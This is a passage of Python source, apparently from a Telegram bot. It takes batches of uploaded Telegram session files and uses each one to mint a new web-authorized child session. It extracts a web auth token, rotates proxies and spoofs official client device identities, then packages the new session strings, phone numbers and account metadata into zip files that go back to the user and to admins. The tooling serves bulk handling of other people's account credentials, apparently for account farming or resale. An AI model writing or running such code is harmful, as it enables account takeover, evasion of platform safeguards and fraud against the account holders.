            if result_temp and os.path.exists(result_temp):
                shutil.rmtree(result_temp, ignore_errors=True)
        except Exception:
            pass
        user_fast_auth_states.pop(user_id, None)

async def process_single_fast_auth(session_path, json_path, user_id, session_name, web_ver):
    result = {
        "session_name": session_name,
        "status": "failed",
        "message": "",
        "error_label": ERR_UNKNOWN,
        "new_session_path": None,
        "new_json_path": None,
        "new_identity_path": None,
    }

    temp_dir = tempfile.mkdtemp()
    new_session_path = os.path.join(temp_dir, f"{session_name}_web.session")
    client_old = None
    client_new = None

    try:
        orig_json_data = {}
        if json_path and os.path.exists(json_path):
            try:
                with open(json_path, 'r', encoding='utf-8') as f:
                    orig_json_data = json.load(f)
            except (OSError, json.JSONDecodeError):
                pass

        try:
            api_id_val = int(orig_json_data.get("app_id") or orig_json_data.get("api_id") or SYNC_API_ID)
        except (TypeError, ValueError):
            api_id_val = SYNC_API_ID
        api_hash_val = str(orig_json_data.get("app_hash") or orig_json_data.get("api_hash") or SYNC_API_HASH)

        device_model = orig_json_data.get("device_model") or None
        app_version = orig_json_data.get("app_version") or None
        system_lang_code = orig_json_data.get("system_lang_code") or None
        system_version = orig_json_data.get("system_version") or orig_json_data.get("sdk") or None
        lang_pack = orig_json_data.get("lang_pack") or None

        session_copy = os.path.join(temp_dir, f"{session_name}_parent.session")
        shutil.copy2(session_path, session_copy)

        proxy = get_random_proxy()
        proxy_dict = create_proxy_dict(proxy) if proxy else None

        official_api_old = build_official_api(
            session_path,
            device_model=device_model,
            system_version=system_version,
            app_version=app_version,
            system_lang_code=system_lang_code,
            lang_pack=lang_pack,
        )
        official_api_old.api_id = api_id_val
        official_api_old.api_hash = api_hash_val

        client_old = OpenteleClient(
            session=str(session_copy),
            api=official_api_old,
            proxy=proxy_dict,
            receive_updates=False,
            timeout=10,
            connection_retries=1
        )
        await asyncio.wait_for(client_old.connect(), timeout=15)

        if not await asyncio.wait_for(client_old.is_user_authorized(), timeout=10):
            result["message"] = "父session无效"
            result["error_label"] = ERR_DEAD
            return result

        me = await asyncio.wait_for(client_old.get_me(), timeout=10)
        if not me:
            result["message"] = "无法获取用户信息"
            result["error_label"] = ERR_DEAD
            return result

        phone = me.phone
        if not phone:
            result["message"] = "无法获取手机号"
            result["error_label"] = ERR_DEAD
            return result

        source_url = web_auth_url(web_ver)
        res = await asyncio.wait_for(
            client_old(RequestUrlAuthRequest(url=source_url)),
            timeout=20
        )
        auth_url = getattr(res, "url", None)
        if not auth_url or "#" not in auth_url:
            result["message"] = "获取网页授权链接失败"
            return result

        params = dict(item.split("=", 1) for item in auth_url.split("#", 1)[1].split("&"))
        token = params.get("tgWebAuthToken")
        try:
            dc = int(params.get("tgWebAuthDcId") or 0)
        except (ValueError, TypeError):
            dc = 0
        if not token or dc not in WEB_DC_IPS:
            result["message"] = "网页授权参数无效"
            return result

        web_api, new_identity_path = resolve_web_api(new_session_path, web_ver)
        proxy_new = get_random_proxy()
        proxy_dict_new = create_proxy_dict(proxy_new) if proxy_new else None

        client_new = OpenteleClient(
            session=str(new_session_path),
            api=web_api,
            proxy=proxy_dict_new,
            receive_updates=False,
            timeout=10,
            connection_retries=1
        )
        client_new.session.set_dc(dc, WEB_DC_IPS[dc], 443)
        await asyncio.wait_for(client_new.connect(), timeout=15)
        await asyncio.wait_for(
            client_new(ImportWebTokenAuthorizationRequest(
                api_id=int(web_api.api_id),
                api_hash=str(web_api.api_hash),
                web_auth_token=token,
            )),
            timeout=20
        )
        me_new = await asyncio.wait_for(client_new.get_me(), timeout=10)
        if not me_new:
            result["message"] = "子授权验证失败"
            result["error_label"] = ERR_UNKNOWN
            return result

        session_string = StringSession.save(client_new.session)
        new_json_data = dict(orig_json_data)
        new_json_data.update({
            "api_id": web_api.api_id,
            "api_hash": web_api.api_hash,
            "app_id": web_api.api_id,
            "app_hash": web_api.api_hash,
            "device_model": web_api.device_model,
            "system_version": web_api.system_version,
            "app_version": web_api.app_version,
            "system_lang_code": web_api.system_lang_code,
            "lang_pack": web_api.lang_pack,
            "lang_code": web_api.lang_code,
            "pid": getattr(web_api, "pid", random.randint(100000, 999999)),
            "user_id": me_new.id,
            "phone": phone,
            "session_file": f"{session_name}_web",
            "device": web_api.device_model,
            "username": me_new.username or "",
            "premium": bool(getattr(me_new, "premium", False)),
            "SDK": web_api.system_version,
            "sdk": web_api.system_version,
            "system_lang_pack": web_api.system_lang_code,
            "session_string": session_string,
            "dc_id": dc,
            "parent_session_kept": True,
            "parent_child_risk": "父会话退出或被踢时，子 Web 授权一定会被 Telegram 一起移除",
            "web_auth": {"source": source_url, "api_id": int(web_api.api_id), "dc_id": dc},
        })

        new_json_path = os.path.join(temp_dir, f"{session_name}_web.json")
        with open(new_json_path, 'w', encoding='utf-8') as f:
            json.dump(new_json_data, f, indent=2, ensure_ascii=False)

        result["status"] = "success"
        result["message"] = "快速新授权生成成功"
        result["new_session_path"] = new_session_path
        result["new_json_path"] = new_json_path
        result["new_identity_path"] = new_identity_path

    except asyncio.TimeoutError:
        result["message"] = "网络操作超时"
    except Exception as e:
        result["message"] = f"错误: {str(e)[:50]}"
        result["error_label"] = classify_rpc_error(e)
    finally:
        if client_old:
            await client_old.disconnect()
        if client_new:
            await client_new.disconnect()
        shutil.rmtree(temp_dir, ignore_errors=True)

    return result

async def _process_fast_auth_internal(update, context, user_id, session_files, extract_dir, result_temp, zip_base, web_ver):
    lang = lang_from_update(update)
    success_dir = os.path.join(result_temp, "success")
    failed_dir = os.path.join(result_temp, "failed")
    pending_dir = os.path.join(result_temp, "pending")
    os.makedirs(success_dir)
    os.makedirs(failed_dir)
    os.makedirs(pending_dir, exist_ok=True)

    async def process_one(item, task):
        session_path = item
        session_basename = os.path.basename(session_path)
        session_name = os.path.splitext(session_basename)[0]
        base_dir = os.path.dirname(session_path)
        json_path = os.path.join(base_dir, f"{session_name}.json")
        if not os.path.exists(json_path):
            for root, dirs, files in os.walk(extract_dir):
                if f"{session_name}.json" in files:
                    json_path = os.path.join(root, f"{session_name}.json")
                    break

        try:
            result = await asyncio.wait_for(
                process_single_fast_auth(session_path, json_path, user_id, session_name, web_ver),
                timeout=120
            )
        except asyncio.TimeoutError:
            result = {
                "session_name": session_name,
                "status": "failed",
                "message": "处理超时（超过120秒）",
                "error_label": ERR_UNKNOWN,
                "new_session_path": None,
                "new_json_path": None,
                "new_identity_path": None,
            }

        if result["status"] == "success":
            for key in ("new_session_path", "new_json_path", "new_identity_path"):
                path = result.get(key)
                if path and os.path.exists(path):
                    shutil.copy2(path, os.path.join(success_dir, os.path.basename(path)))
            return {"category": "success", "name": session_name}

        label = result.get("error_label") or ERR_UNKNOWN
        place_failed(
            failed_dir,
            label,
            [session_path] + ([json_path] if json_path and os.path.exists(json_path) else []),
            subdir_name=session_name
        )
        return {"category": "fail", "error": label, "name": session_name}

    task = BatchTask(user_id, update.effective_chat.id, session_files, "fast_auth")
    watchdog = arm_timeout(task, MAX_TASK_TIME)

    async def on_progress(t):
        c = {"success": 0, "fail": 0}
        for r in t.done:
            if r.get("category") in c:
                c[r["category"]] += 1
        t._progress_text = f"""<tg-emoji emoji-id="{FAST_AUTH_EMOJI_ID}">🚀</tg-emoji> <b>{tr('fast_auth.in_progress', lang)}</b>

{tr('shaihuo.progress', lang)}: {t.completed}/{len(session_files)}
<tg-emoji emoji-id="{SYNC_SUCCESS_EMOJI_ID}">✅</tg-emoji> {tr('shaihuo.success', lang)}: {c['success']} | <tg-emoji emoji-id="{SYNC_FAIL_EMOJI_ID}">❌</tg-emoji> {tr('2fa.failed', lang)}: {c['fail']}"""

    await run_batch(update, context, task, process_one, on_progress=on_progress)

    if not watchdog.done():
        watchdog.cancel()

    if task.stopped:
        for item in task.remaining_pending():
            session_path = item
            session_basename = os.path.basename(session_path)
            session_name = os.path.splitext(session_basename)[0]
            pdir = os.path.join(pending_dir, session_name)
            os.makedirs(pdir, exist_ok=True)
            if os.path.exists(session_path):
                shutil.copy2(session_path, os.path.join(pdir, session_basename))
            json_path = os.path.join(os.path.dirname(session_path), f"{session_name}.json")
            if os.path.exists(json_path):
                shutil.copy2(json_path, os.path.join(pdir, os.path.basename(json_path)))

    def result_text_fn(cats, pending):
        return f"""<tg-emoji emoji-id="{SYNC_SUCCESS_EMOJI_ID}">✅</tg-emoji> <b>{tr('fast_auth.done', lang)}</b>

{tr('recovery.total_accounts', lang)}: {len(session_files)}
<tg-emoji emoji-id="{SYNC_SUCCESS_EMOJI_ID}">✅</tg-emoji> {tr('shaihuo.success', lang)}: {cats['success']}
<tg-emoji emoji-id="{SYNC_FAIL_EMOJI_ID}">❌</tg-emoji> {tr('2fa.failed', lang)}: {cats['fail']}
<tg-emoji emoji-id="{SYNC_FAIL_EMOJI_ID}">❌</tg-emoji> {tr('fast_auth.parent_child_risk', lang)}"""

    await pack_and_send(
        context,
        update,
        task,
        categories={
            "success": (success_dir, None, lambda n: f"<b>{tr('fast_auth.success_caption', lang)} ({n}{tr('recovery.accounts_unit', lang)})</b>"),
            "fail": (failed_dir, None, lambda n: f"<b>{tr('fast_auth.failed_caption', lang)} ({n}{tr('recovery.accounts_unit', lang)})</b>"),
        },
        admins=(ADMIN_ID.split(',') if ADMIN_ID else []),
        lang=lang,
        result_text_fn=result_text_fn,
        pending_dir=pending_dir,
        zip_base=zip_base or f"fast_auth_{user_id}",
    )
